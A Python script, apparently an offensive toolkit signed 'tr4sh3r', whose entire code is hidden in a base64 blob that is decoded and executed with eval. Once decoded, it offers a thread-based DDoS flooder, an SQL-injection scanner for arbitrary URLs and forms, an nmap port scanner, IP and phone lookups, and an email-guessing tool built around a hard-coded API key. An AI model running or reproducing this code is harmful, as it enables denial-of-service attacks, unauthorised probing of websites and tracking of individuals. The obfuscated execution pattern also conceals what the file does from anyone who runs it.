#!/bin/python
#by tr4sh3r.py
import base64
x = """IyEvYmluL3B5dGhvbgoKaW1wb3J0IHJlcXVlc3RzLCBvcywgc3lzLCBwaG9uZW51bWJlcnMsIHNv Y2tldCwgdGhyZWFkaW5nLCBubWFwCmZyb20gbm1hcCBpbXBvcnQgKgpmcm9tIHBob25lbnVtYmVy cyBpbXBvcnQgdGltZXpvbmUsIGNhcnJpZXIsIGdlb2NvZGVyCmZyb20gYnM0IGltcG9ydCBCZWF1 dGlmdWxTb3VwIGFzIGJzCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxqb2luCmZyb20gcHBy aW50IGltcG9ydCBwcHJpbnQKCgpyZWQgPSAiXDAzM1sxOzMxbSIKYmx1ZSA9ICJcMDMzWzE7MzRt IgpwdXJwbGUgPSAiXDAzM1sxOzM1bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVzZXQgPSAiXDAz M1sxOzBtIgpsb2dvID0gIiIiCiBcMDMzWzMxbV8gIF8gXDAzM1szNW0gX19fIF9fX18gX19fXyBf ICAgIF8gIF8gXyBfX18KIFwwMzNbMzFtIFwvICBcMDMzWzM1bSAgfCAgfCAgfCB8ICB8IHwgICAg fF8vICB8ICB8CiBcMDMzWzMxbV8vXF8gXDAzM1szNW0gIHwgIHxfX3wgfF9ffCB8X19fIHwgXF8g fCAgfAoKICAgICAgICAgICAgICBcMDMzWzE7MzRtYnkgdHI0c2gzciIiIgpkZWYgbWVudSgpOgog ICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChsb2dvKQogICAgcHJpbnQoZiIiIntwdXJw bGV9CnNlbGVjdCBhbiBvcHRpb24gb3IgdHlwZSBleGl0IHRvIGV4aXQgCiAgICAgICAgICAKICAg MDEgaXAgbG9jYXRpb24gIDA0IHBvcnQgc2Nhbm5lcgogICAwMiBwaG9uZWluZm8gICAgMDUgc3Fs aSBzY2FubmVyCiAgIDAzIGRkb3MgYXR0YWNrICAwNiBtYWlsZmluZGVyCiAgICAgICAgICAgIiIi KQogICAgbWFpbm1lbnUoKQoKZGVmIG1haW5tZW51KCk6CiAgICBjbWQgPSBzdHIoaW5wdXQoIkNo b29zZSA+ICIpKQogICAgaWYgY21kIGluICgiZXhpdCIsIkV4aXQiKToKICAgICAgICBvcy5zeXN0 ZW0oJ2V4aXQnKQogICAgZWxpZiBjbWQgaW4gKCIxIiwiMDEiKToKICAgICAgICBpcGxvY2F0aW9u KCkKICAgIGVsaWYgY21kIGluICgiMiIsIjAyIik6CiAgICAgICAgcGhvbmVpbmZvKCkKICAgIGVs aWYgY21kIGluICgiMyIsIjAzIik6CiAgICAgICAgZGRvcygpCiAgICBlbGlmIGNtZCBpbiAoIjQi LCIwNCIpOgogICAgICAgIHBvcnRzY2FubmVyKCkKICAgIGVsaWYgY21kIGluICgiNSIsIjA1Iik6 CiAgICAgICAgc3FsaXNjYW5uZXIoKQogICAgZWxpZiBjbWQgaW4gKCI2IiwiMDYiKToKICAgICAg ICBtYWlsZmluZGVyKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIm9wdGlvbiBpbmNvcnJlY3Qh ISEiKQogICAgICAgIG9zLnN5c3RlbSgnLi94JykKZGVmIGlwbG9jYXRpb24oKToKICAgIHggPSBz dHIoaW5wdXQoIlxuZW50ZXIgaXAgPiAiKSkKICAgIHByaW50KGJsdWUpCiAgICByZXEgPSByZXF1 ZXN0cy5nZXQoImh0dHBzOi8vaXBpbmZvLmlvLyIreCsiL2pzb24iKS5qc29uKCkKICAgIHRyeTog aXAgPSAiSVA6ICIrcmVxWyJpcCJdCiAgICBleGNlcHQgS2V5RXJyb3I6IGlwID0gIiIKICAgIHRy eTogY2l0eSA9ICJDSVRZOiAiK3JlcVsiY2l0eSJdCiAgICBleGNlcHQgS2V5RXJyb3I6IGNpdHkg PSAiIgogICAgdHJ5OiBjb3VudHJ5ID0gIkNPVU5UUlk6ICIrcmVxWyJjb3VudHJ5Il0KICAgIGV4 Y2VwdCBLZXlFcnJvcjogY291bnRyeSA9ICIiCiAgICB0cnk6IGxvYyA9ICJMT0M6ICIrcmVxWyJs b2MiXQogICAgZXhjZXB0IEtleUVycm9yOiBsb2MgPSAiIgogICAgdHJ5OiBvcmcgPSAiT1JHOiAi K3JlcVsib3JnIl0KICAgIGV4Y2VwdCBLZXlFcnJvcjogb3JnID0gIiIKICAgIHRyeTogdHogPSAi VElNRVpPTkU6ICIrcmVxWyJ0aW1lem9uZSJdCiAgICBleGNlcHQgS2V5RXJyb3I6IHR6ID0gIiIK ICAgIHogPSBbaXAsIGNpdHksIGNvdW50cnksIGxvYywgb3JnLCB0el0KICAgIGZvciByZXMgaW4g ejoKICAgICAgICBwcmludChmIntyZXN9IikKICAgICAgICAKZGVmIG1haWxmaW5kZXIoKToKICAg IHByaW50KCIgIikKICAgIGZ1bGxuYW1lID0gc3RyKGlucHV0KGYiZW50ZXIgbmFtZSA+ICIpLmxv d2VyKCkpCiAgICBwcmludCgiICIpCiAgICBpZiBub3QgZnVsbG5hbWU6IG1lbnUoKQogICAgZGF0 YSA9IFsKICAgICAgICAiZ21haWwuY29tIiwKICAgICAgICAieWFob28uY29tIiwKICAgICAgICAi aG90bWFpbC5jb20iLAogICAgICAgICJhb2wuY29tIiwKICAgICAgICAibXNuLmNvbSIsCiAgICAg ICAgImNvbWNhc3QubmV0IiwKICAgICAgICAibGl2ZS5jb20iLAogICAgICAgICJyZWRpZmZtYWls LmNvbSIsCiAgICAgICAgInltYWlsLmNvbSIsCiAgICAgICAgIm91dGxvb2suY29tIiwKICAgICAg ICAiY294Lm5ldCIsCiAgICAgICAgImdvb2dsZW1haWwuY29tIiwKICAgICAgICAicm9ja2V0bWFp bC5jb20iLAogICAgICAgICJhdHQubmV0IiwKICAgICAgICAiZmFjZWJvb2suY29tIiwKICAgICAg ICAiYmVsbHNvdXRoLm5ldCIsCiAgICAgICAgImNoYXJ0ZXIubmV0IiwKICAgICAgICAic2t5LmNv bSIsCiAgICAgICAgImVhcnRobGluay5uZXQiLAogICAgICAgICJvcHRvbmxpbmUubmV0IiwKICAg ICAgICAicXEuY29tIiwKICAgICAgICAibWUuY29tIiwKICAgICAgICAiZ214Lm5ldCIsCiAgICAg ICAgIm1haWwuY29tIiwKICAgICAgICAibnRsd29ybGQuY29tIiwKICAgICAgICAiZnJvbnRpZXJu ZXQubmV0IiwKICAgICAgICAid2luZHN0cmVhbS5uZXQiLAogICAgICAgICJtYWMuY29tIiwKICAg ICAgICAiY2VudHVyeXRlbC5uZXQiLAogICAgICAgICJhaW0uY29tIiwKICAgICAgICBdCiAgICBs aXN0dXNlciA9IFsKICAgICAgICBmdWxsbmFtZS5yZXBsYWNlKCIgIiwiIiksCiAgICAgICAgZnVs bG5hbWUucmVwbGFjZSgiICIsIiIpKyIxMjMiLAogICAgICAgIGZ1bGxuYW1lLnJlcGxhY2UoIiAi LCIiKSsiMTIzNCIsCiAgICAgICAgXQogICAgZm9yIG5hbWUgaW4gZnVsbG5hbWUuc3BsaXQoIiAi KToKICAgICAgICBsaXN0dXNlci5hcHBlbmQobmFtZSkKICAgICAgICBsaXN0dXNlci5hcHBlbmQo bmFtZSsiMTIzIikKICAgICAgICBsaXN0dXNlci5hcHBlbmQobmFtZSsiMTIzNCIpCiAgICBmID0g b3BlbigicmVzdWx0X21haWxmaW5kZXIudHh0IiwidyIpCiAgICBvayA9IFtdCiAgICB0cnk6CiAg ICAgICAgZm9yIHVzZXIgaW4gbGlzdHVzZXI6CiAgICAgICAgICAgIGZvciBkb21haW4gaW4gZGF0 YToKICAgICAgICAgICAgICAgIGVtYWlsID0gdXNlciArICJAIiArIGRvbWFpbgogICAgICAgICAg ICAgICAgYXBpID0gIjBjNmFkMWZkLWY3NTMtNDYyOC04YzBhLTc5NjhlNzIyYzZjNyIKICAgICAg ICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAgICAgICAgICJo dHRwczovL2lzaXRhcmVhbGVtYWlsLmNvbS9hcGkvZW1haWwvdmFsaWRhdGUiLAogICAgICAgICAg ICAgICAgICAgIHBhcmFtcyA9IHsnZW1haWwnOiBlbWFpbH0sCiAgICAgICAgICAgICAgICAgICAg aGVhZGVycyA9IHsnQXV0aG9yaXphdGlvbic6ICJCZWFyZXIgIiArIGFwaSB9KQogICAgICAgICAg ICAgICAgc3RhdHVzID0gcmVzcG9uc2UuanNvbigpWydzdGF0dXMnXQogICAgICAgICAgICAgICAg aWYgc3RhdHVzID09ICJ2YWxpZCI6CiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKGVtYWls KQogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZW1haWwrIlxuIikKICAgICAgICAgICAgICAg ICAgICBwcmludChmIntibHVlfURPTkUge3Jlc2V0fVN0YXR1czoge2dyZWVufXZhbGlkIHtyZXNl dH1FbWFpbDoge2VtYWlsfSIpCiAgICAgICAgICAgICAgICBlbHNlOiBwYXNzCiAgICBleGNlcHQg S2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoIlxyIiksO3N5cy5zdGRvdXQuZmx1c2go KQogICAgICAgIHBhc3MKICAgIGYuY2xvc2UoKQogICAgcHJpbnQoZiJ7c3RyKGxlbihvaykpfSBy ZXRyaWV2ZWQgYXM6IHJlc3VsdF9tYWlsZmluZGVyLnR4dCIpCiAgICAKZGVmIHNxbGlzY2FubmVy KCk6CiAgICBzID0gcmVxdWVzdHMuU2Vzc2lvbigpIAogICAgcy5oZWFkZXJzWyJVc2VyLUFnZW50 Il0gPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJL aXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg3LjAuNDI4MC44OCBTYWZhcmkv NTM3LjM2IgogICAgZGVmIGdldF9hbGxfZm9ybXModXJsKToKICAgICAgICBzb3VwID0gYnMocy5n ZXQodXJsKS5jb250ZW50LCAiaHRtbC5wYXJzZXIiKQogICAgICAgIHJldHVybiBzb3VwLmZpbmRf YWxsKCJmb3JtIikKICAgIAogICAgZGVmIGdldF9mb3JtX2RldGFpbHMoZm9ybSk6CiAgICAgICAg ZGV0YWlscyA9IHt9CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhY3Rpb24gPSBmb3JtLmF0dHJz LmdldCgiYWN0aW9uIikubG93ZXIoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgYWN0aW9u ID0gTm9uZQogICAgICAgIG1ldGhvZCA9IGZvcm0uYXR0cnMuZ2V0KCJtZXRob2QiLCAiZ2V0Iiku bG93ZXIoKQogICAgICAgIGlucHV0cyA9IFtdCiAgICAgICAgZm9yIGlucHV0X3RhZyBpbiBmb3Jt LmZpbmRfYWxsKCJpbnB1dCIpOgogICAgICAgICAgICBpbnB1dF90eXBlID0gaW5wdXRfdGFnLmF0 dHJzLmdldCgidHlwZSIsICJ0ZXh0IikKICAgICAgICAgICAgaW5wdXRfbmFtZSA9IGlucHV0X3Rh Zy5hdHRycy5nZXQoIm5hbWUiKQogICAgICAgICAgICBpbnB1dF92YWx1ZSA9IGlucHV0X3RhZy5h dHRycy5nZXQoInZhbHVlIiwgIiIpCiAgICAgICAgICAgIGlucHV0cy5hcHBlbmQoeyJ0eXBlIjog aW5wdXRfdHlwZSwgIm5hbWUiOiBpbnB1dF9uYW1lLCAidmFsdWUiOiBpbnB1dF92YWx1ZX0pCiAg ICAgICAgZGV0YWlsc1siYWN0aW9uIl0gPSBhY3Rpb24KICAgICAgICBkZXRhaWxzWyJtZXRob2Qi XSA9IG1ldGhvZAogICAgICAgIGRldGFpbHNbImlucHV0cyJdID0gaW5wdXRzCiAgICAgICAgcmV0 dXJuIGRldGFpbHMKICAgICAgICAKICAgIGRlZiBpc192dWxuZXJhYmxlKHJlc3BvbnNlKToKICAg ICAgICAiIiJBIHNpbXBsZSBib29sZWFuIGZ1bmN0aW9uIHRoYXQgZGV0ZXJtaW5lcyB3aGV0aGVy IGEgcGFnZSAKICAgICAgICBpcyBTUUwgSW5qZWN0aW9uIHZ1bG5lcmFibGUgZnJvbSBpdHMgYHJl c3BvbnNlYCIiIgogICAgICAgIGVycm9ycyA9IHsKICAgICAgICAjIE15U1FMCiAgICAgICAgInlv dSBoYXZlIGFuIGVycm9yIGluIHlvdXIgc3FsIHN5bnRheDsiLAogICAgICAgICJ3YXJuaW5nOiBt eXNxbCIsCiAgICAgICAgIyBTUUwgU2VydmVyCiAgICAgICAgInVuY2xvc2VkIHF1b3RhdGlvbiBt YXJrIGFmdGVyIHRoZSBjaGFyYWN0ZXIgc3RyaW5nIiwKICAgICAgICAjIE9yYWNsZQogICAgICAg ICJxdW90ZWQgc3RyaW5nIG5vdCBwcm9wZXJseSB0ZXJtaW5hdGVkIiwKICAgICAgICB9CiAgICAg ICAgZm9yIGVycm9yIGluIGVycm9yczoKICAgICAgICAjIGlmIHlvdSBmaW5kIG9uZSBvZiB0aGVz ZSBlcnJvcnMsIHJldHVybiBUcnVlCiAgICAgICAgICAgIGlmIGVycm9yIGluIHJlc3BvbnNlLmNv bnRlbnQuZGVjb2RlKCkubG93ZXIoKToKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAj IG5vIGVycm9yIGRldGVjdGVkCiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIGRlZiBzY2Fu X3NxbF9pbmplY3Rpb24odXJsKToKICAgICMgdGVzdCBvbiBVUkwKICAgICAgICBmb3IgYyBpbiAi XCInIjoKICAgICAgICAjIGFkZCBxdW90ZS9kb3VibGUgcXVvdGUgY2hhcmFjdGVyIHRvIHRoZSBV UkwKICAgICAgICAgICAgbmV3X3VybCA9IGYie3VybH17Y30iCiAgICAgICAgICAgIHByaW50KCJb IV0gVHJ5aW5nIiwgbmV3X3VybCkKICAgICAgICAjIG1ha2UgdGhlIEhUVFAgcmVxdWVzdAogICAg ICAgICAgICByZXMgPSBzLmdldChuZXdfdXJsKQogICAgICAgICAgICBpZiBpc192dWxuZXJhYmxl KHJlcyk6CiAgICAgICAgICAgICMgU1FMIEluamVjdGlvbiBkZXRlY3RlZCBvbiB0aGUgVVJMIGl0 c2VsZiwgCiAgICAgICAgICAgICMgbm8gbmVlZCB0byBwcmVjZWVkIGZvciBleHRyYWN0aW5nIGZv cm1zIGFuZCBzdWJtaXR0aW5nIHRoZW0KICAgICAgICAgICAgICAgIHByaW50KCJbK10gU1FMIElu amVjdGlvbiB2dWxuZXJhYmlsaXR5IGRldGVjdGVkLCBsaW5rOiIsIG5ld191cmwpCiAgICAgICAg ICAgICAgICByZXR1cm4KICAgICMgdGVzdCBvbiBIVE1MIGZvcm1zCiAgICAgICAgZm9ybXMgPSBn ZXRfYWxsX2Zvcm1zKHVybCkKICAgICAgICBwcmludChmIlsrXSBEZXRlY3RlZCB7bGVuKGZvcm1z KX0gZm9ybXMgb24ge3VybH0uIikKICAgICAgICBmb3IgZm9ybSBpbiBmb3JtczoKICAgICAgICAg ICAgZm9ybV9kZXRhaWxzID0gZ2V0X2Zvcm1fZGV0YWlscyhmb3JtKQogICAgICAgICAgICBmb3Ig YyBpbiAiXCInIjoKICAgICAgICAgICAgIyB0aGUgZGF0YSBib2R5IHdlIHdhbnQgdG8gc3VibWl0 CiAgICAgICAgICAgICAgICBkYXRhID0ge30KICAgICAgICAgICAgICAgIGZvciBpbnB1dF90YWcg aW4gZm9ybV9kZXRhaWxzWyJpbnB1dHMiXToKICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dF90 YWdbInR5cGUiXSA9PSAiaGlkZGVuIiBvciBpbnB1dF90YWdbInZhbHVlIl06CiAgICAgICAgICAg ICAgICAgICAgIyBhbnkgaW5wdXQgZm9ybSB0aGF0IGlzIGhpZGRlbiBvciBoYXMgc29tZSB2YWx1 ZSwKICAgICAgICAgICAgICAgICAgICAjIGp1c3QgdXNlIGl0IGluIHRoZSBmb3JtIGJvZHkKICAg ICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0 YVtpbnB1dF90YWdbIm5hbWUiXV0gPSBpbnB1dF90YWdbInZhbHVlIl0gKyBjCiAgICAgICAgICAg ICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAg ICAgICAgICAgICAgICAgICBlbGlmIGlucHV0X3RhZ1sidHlwZSJdICE9ICJzdWJtaXQiOgogICAg ICAgICAgICAgICAgICAgICMgYWxsIG90aGVycyBleGNlcHQgc3VibWl0LCB1c2Ugc29tZSBqdW5r IGRhdGEgd2l0aCBzcGVjaWFsIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBkYXRh W2lucHV0X3RhZ1sibmFtZSJdXSA9IGYidGVzdHtjfSIKICAgICAgICAgICAgIyBqb2luIHRoZSB1 cmwgd2l0aCB0aGUgYWN0aW9uIChmb3JtIHJlcXVlc3QgVVJMKQogICAgICAgICAgICAgICAgdXJs ID0gdXJsam9pbih1cmwsIGZvcm1fZGV0YWlsc1siYWN0aW9uIl0pCiAgICAgICAgICAgICAgICBp ZiBmb3JtX2RldGFpbHNbIm1ldGhvZCJdID09ICJwb3N0IjoKICAgICAgICAgICAgICAgICAgICBy ZXMgPSBzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICBlbGlmIGZvcm1fZGV0 YWlsc1sibWV0aG9kIl0gPT0gImdldCI6CiAgICAgICAgICAgICAgICAgICAgcmVzID0gcy5nZXQo dXJsLCBwYXJhbXM9ZGF0YSkKICAgICAgICAgICAgIyB0ZXN0IHdoZXRoZXIgdGhlIHJlc3VsdGlu ZyBwYWdlIGlzIHZ1bG5lcmFibGUKICAgICAgICAgICAgICAgIGlmIGlzX3Z1bG5lcmFibGUocmVz KToKICAgICAgICAgICAgICAgICAgICBwcmludCgiWytdIFNRTCBJbmplY3Rpb24gdnVsbmVyYWJp bGl0eSBkZXRlY3RlZCwgbGluazoiLCB1cmwpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlsr XSBGb3JtOiIpCiAgICAgICAgICAgICAgICAgICAgcHByaW50KGZvcm1fZGV0YWlscykKICAgICAg ICAgICAgICAgICAgICBicmVhawogICAgaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgICAg ICBwcmludCgiIikKICAgICAgICB1cmwgPSBpbnB1dCgiZW50ZXIgd2Vic2l0ZSB1cmwgPiAiKQog ICAgICAgIHByaW50KGdyZWVuKQogICAgICAgIHNjYW5fc3FsX2luamVjdGlvbih1cmwpCiAgICAK ZGVmIHBob25laW5mbygpOgogICAgbnVtYmVyID0gaW5wdXQoIlxuZW50ZXIgcGhvbmVudW1iZXIg ID4gIikKICAgIHByaW50KGJsdWUpCiAgICBwaCA9IHBob25lbnVtYmVycy5wYXJzZShudW1iZXIp CiAgICBwcmludChwaCkKICAgIHByaW50KCJ0aW1lem9uZTogIix0aW1lem9uZS50aW1lX3pvbmVz X2Zvcl9udW1iZXIocGgpKQogICAgcHJpbnQoImNhcnJpZXI6ICIsY2Fycmllci5uYW1lX2Zvcl9u dW1iZXIocGgsICJlbiIpKQogICAgcHJpbnQoInJlZ2lvbjogIixnZW9jb2Rlci5kZXNjcmlwdGlv bl9mb3JfbnVtYmVyKHBoLCAiZW4iKSkKICAgIApkZWYgZGRvcygpOgogICAgaG9zdCA9IGlucHV0 KCJcbmVudGVyIHRhcmdldCBpcCA+ICIpCiAgICBwb3J0ID0gaW50KGlucHV0KCJlbnRlciBwb3J0 ID4gIikpCiAgICBwcmludCgiXG4iKQogICAgZGVmIHJ1bihoKToKICAgICAgICB3aGlsZSBUcnVl OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09D S19TVFJFQU0pCiAgICAgICAgICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkKICAgICAgICAgICAg cHJpbnQoIlBhY2tldCBzZW5kIHRvICIgKyBob3N0KQogICAgZm9yIGkgaW4gcmFuZ2UoNSk6CiAg ICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJ1biwgYXJncz1baV0pCiAgICAgICAg dC5zdGFydCgpCgpkZWYgcG9ydHNjYW5uZXIoKToKICAgIHRhcmdldCA9IGlucHV0KCJcbmVudGVy IHRhcmdldCBpcCBvciBkb21haW4gPiAiKQogICAgcmFuZ2UgPSBpbnB1dCgiZW50ZXIgcmFuZ2Ug KGV4YW1wbGU6IDIwLTgwKSA+ICIpCiAgICBubSA9IG5tYXAuUG9ydFNjYW5uZXIoKSAgICAgICAg ICAgCiAgICBubS5zY2FuKHRhcmdldCxyYW5nZSkgCiAgICBwcmludChyZXNldCkKICAgIGZvciBo b3N0IGluIG5tLmFsbF9ob3N0cygpOiAgICAgICAKICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0t LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQogICAgICAgIHByaW50 KCdIb3N0IDogJXMgKCVzKScgJSAoaG9zdCxubVtob3N0XS5ob3N0bmFtZSgpKSkgICAgCiAgICAg ICAgcHJpbnQoJ1N0YXRlIDogJXMnICUgbm1baG9zdF0uc3RhdGUoKSkgICAgICAgICAgICAgICAg IAogICAgICAgIGZvciBwcm90byBpbiBubVtob3N0XS5hbGxfcHJvdG9jb2xzKCk6ICAgICAgICAg ICAgICAgICAgCiAgICAgICAgICAgIHByaW50KCctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCiAgICAgICAgICAgIHByaW50KCdwcm90b2NvbCA6 ICVzJyAlIHByb3RvICkgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgbHBvcnQgPSBu bVtob3N0XVtwcm90b10ua2V5cygpICAgICAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgcG9y dCBpbiBscG9ydDogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQoJ3BvcnQgOiAlc1x0c3Rh dGUgOiAlcycgJSAocG9ydCxubVtob3N0XVtwcm90b11bcG9ydF1bJ3N0YXRlJ10pKSAgICAgICAg ICAKICAgICAgICAgICAgICAgIAptZW51KCkK"""
eval(compile(base64.b64decode(x),'','exec'))
